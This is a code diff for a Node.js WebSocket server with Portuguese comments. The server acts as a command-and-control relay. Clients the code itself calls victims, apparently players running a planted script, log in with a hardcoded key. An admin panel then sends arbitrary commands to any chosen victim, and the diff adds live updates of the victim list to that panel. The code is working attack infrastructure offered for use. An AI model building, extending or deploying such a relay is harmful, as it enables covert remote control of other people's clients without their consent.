@@ -1,17 +1,24 @@
 const WebSocket = require('ws');
 
-// O Render define uma porta automática via process.env.PORT, senão usa a 8080 por padrão
 const PORT = process.env.PORT || 8080;
 const wss = new WebSocket.Server({ port: PORT });
 
-// ⚠️ MUDE ISSO PARA UMA SENHA DIFÍCIL QUE SÓ VOCÊ SABE!
 const CHAVE_SECRETA = "BatataFritaComQueijo123";
 
-// Armazena as conexões ativas
 let clientesConectados = new Map(); // Guarda socket -> nome do jogador (vítima)
 let painelAdmin = null; // Guarda a conexão do seu painel de controle
 
 console.log(`[SERVIDOR] WebSocket rodando com sucesso na porta ${PORT}...`);
+
+// Função auxiliar para mandar a lista atualizada para o admin
+function atualizarListaAdmin() {
+    if (painelAdmin && painelAdmin.readyState === WebSocket.OPEN) {
+        painelAdmin.send(JSON.stringify({
+            tipo: "atualizar_lista",
+            clientes: Array.from(clientesConectados.keys())
+        }));
+    }
+}
 
 wss.on('connection', (ws) => {
     console.log('[CONEXÃO] Novo cliente conectado ao servidor.');
@@ -25,7 +32,7 @@ wss.on('connection', (ws) => {
             return;
         }
 
-        // 1. Autenticação das Vítimas (Jogadores rodando seu script)
+        // 1. Autenticação das Vítimas
         if (data.tipo === 'auth') {
             if (data.chave !== CHAVE_SECRETA) {
                 console.log('[AUTENTICAÇÃO FALHOU] Chave secreta incorreta de um cliente.');
@@ -35,9 +42,10 @@ wss.on('connection', (ws) => {
             clientesConectados.set(data.jogador, ws);
             ws.nomeJogador = data.jogador;
             console.log(`[VÍTIMA CONECTADA]: ${data.jogador}`);
+            atualizarListaAdmin(); // Atualiza a lista no painel
         }
 
-        // 2. Autenticação do Seu Painel Admin (O script que só você roda)
+        // 2. Autenticação do Painel Admin
         if (data.tipo === 'auth_admin') {
             if (data.chave !== CHAVE_SECRETA) {
                 console.log('[AUTENTICAÇÃO FALHOU] Tentativa inválida de login no Admin.');
@@ -46,6 +54,7 @@ wss.on('connection', (ws) => {
             }
             painelAdmin = ws;
             console.log('[PAINEL ADMIN CONECTADO COM SUCESSO]');
+            atualizarListaAdmin(); // Manda a lista atual logo de cara
         }
 
         // 3. O Painel Admin manda um comando para um alvo específico
@@ -53,7 +62,6 @@ wss.on('connection', (ws) => {
             let alvoSocket = clientesConectados.get(data.alvo);
             
             if (alvoSocket && alvoSocket.readyState === WebSocket.OPEN) {
-                // Repassa o comando exato para o WebSocket da vítima
                 alvoSocket.send(JSON.stringify({
                     comando: data.comando
                 }));
@@ -64,7 +72,6 @@ wss.on('connection', (ws) => {
         }
     });
 
-    // Evento quando alguém se desconecta
     ws.on('close', () => {
         if (ws === painelAdmin) {
             painelAdmin = null;
@@ -72,10 +79,10 @@ wss.on('connection', (ws) => {
         } else if (ws.nomeJogador) {
             clientesConectados.delete(ws.nomeJogador);
             console.log(`[VÍTIMA DESCONECTADA]: ${ws.nomeJogador}`);
+            atualizarListaAdmin(); // Atualiza a lista tirando quem saiu
         }
     });
 
-    // Lida com erros de conexão para o servidor não cair
     ws.on('error', (err) => {
         console.log('[ERRO NO SOCKET]:', err.message);
     });
